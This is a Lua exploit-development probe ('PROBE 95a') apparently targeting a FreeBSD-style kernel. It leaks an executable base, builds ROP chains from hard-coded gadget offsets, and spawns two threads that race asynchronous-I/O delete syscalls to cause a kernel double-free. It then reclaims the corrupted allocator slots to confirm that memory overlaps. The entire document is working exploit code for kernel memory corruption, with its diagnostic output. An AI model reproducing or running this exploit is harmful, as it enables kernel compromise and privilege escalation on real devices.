-- CRASH_CLASS: HIGH
-- PROBE 95a: prolapse double-free + same-type overlap detection
--
-- 77g's proven race (21+ doubles/run) + AIO same-type reclaim.
-- After double-free corrupts UMA freelist (X→X→Y→Z):
-- 1. Submit new AIO entries → two consecutive allocs get same physical slot
-- 2. Delete every other entry
-- 3. Poll the remaining ones — freed entries show anomalous status
--
-- This detects memory overlap without needing cross-subsystem spray.
-- Generation-checked IDs are in a SEPARATE table from entry memory,
-- so B's ID is still valid when A (sharing same memory) is freed.

print("=== PROBE 95a: PROLAPSE OVERLAP COMBINED ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Open /dev/zero (global, reused — matches 77g pattern)
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- Global buffers (matches 77g — no per-call alloc!)
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEAD
end

-- Init + pre-drain (exactly 77g)
pcall(function() mk(670)() end)
print("[0] Pre-drain")
for i = 1, 64 do
    local id = submit_one()
    if id ~= 0 then poll_one(id); delete_one(id) end
end
print("  done")

-- ============================
-- [1] RACE + SAME-TYPE RECLAIM + OVERLAP DETECTION
-- ============================
print("")
print("[1] RACE + OVERLAP DETECTION")
local ITERS = 15
local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

local total_doubles = 0
local total_anomalies = 0

for iter = 1, ITERS do
    if not alive() then print("DEAD at iter " .. iter); break end

    -- Submit batch (same as 77g)
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < 4 then print("  too few: " .. #ids); break end
    local count = #ids

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Two children race-delete (exactly 77g)
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662)); emA(stub)
    emA(g_pop_rdi); emA(uint64(0)); emA(g_pop_rax); emA(uint64(431)); emA(stub)

    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662)); emB(stub)
    emB(g_pop_rdi); emB(uint64(0)); emB(g_pop_rax); emB(uint64(431)); emB(stub)

    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A)); wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0)); wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B)); wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0)); wq(N(par_B) + 0x30, tB)

    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait for children (same spin as 77g)
    for w = 1, 50000 do local _ = rd(sb_A) end

    -- Count doubles
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        -- *** SAME-TYPE RECLAIM ***
        -- After the double-free, the UMA freelist has duplicated slots.
        -- Submit new AIO entries → consecutive allocs return the same slot.
        -- We submit pairs: reclaim_A[i] and reclaim_B[i] should overlap.
        local RECLAIM_PAIRS = doubles * 2 + 4
        local rec_a_ids = {}
        local rec_b_ids = {}

        for p = 1, RECLAIM_PAIRS do
            local id_a = submit_one()
            local id_b = submit_one()
            if id_a ~= 0 and id_b ~= 0 then
                rec_a_ids[#rec_a_ids + 1] = id_a
                rec_b_ids[#rec_b_ids + 1] = id_b
            end
        end

        -- Now test: delete rec_a[i], then poll rec_b[i].
        -- If they share memory, B's internal status may change after A is freed.
        local anomalies = 0
        for p = 1, math.min(#rec_a_ids, #rec_b_ids) do
            -- First, poll B to get baseline status
            local baseline = poll_one(rec_b_ids[p])

            -- Delete A
            local del_st = delete_one(rec_a_ids[p])

            -- Poll B again — if B shares memory with A, B's status may be corrupted
            local after = poll_one(rec_b_ids[p])

            -- Check for anomaly: status changed, or unexpected value
            if after ~= baseline then
                anomalies = anomalies + 1
                if anomalies <= 8 then
                    print(string.format("  iter %d pair %d: *** STATUS CHANGE baseline=0x%08X after=0x%08X del_a=0x%08X ***",
                        iter, p, baseline, after, del_st))
                end
            end

            -- Also check if B shows "deleted" marker (0x80020003)
            if after == 0x80020003 or after == 0xDEAD then
                if anomalies == 0 then anomalies = anomalies + 1 end
                print(string.format("  iter %d pair %d: *** B SHOWS DELETED/DEAD status=0x%08X ***",
                    iter, p, after))
            end
        end

        total_anomalies = total_anomalies + anomalies

        -- Cleanup remaining B entries
        for p = 1, #rec_b_ids do
            delete_one(rec_b_ids[p])
        end

        print(string.format("  iter %d: %d doubles, %d pairs, %d anomalies%s",
            iter, doubles, math.min(#rec_a_ids, #rec_b_ids), anomalies,
            anomalies > 0 and " ***HIT***" or ""))
    else
        if iter <= 2 or iter == ITERS then
            print(string.format("  iter %d: clean", iter))
        end
    end
end

print("")
print(string.format("TOTAL: doubles=%d anomalies=%d alive=%s",
    total_doubles, total_anomalies, alive() and "Y" or "N"))
if total_anomalies > 0 then
    print("*** OVERLAP CONFIRMED: same-type reclaim produces shared entries ***")
end
print("=== 95a COMPLETE ===")
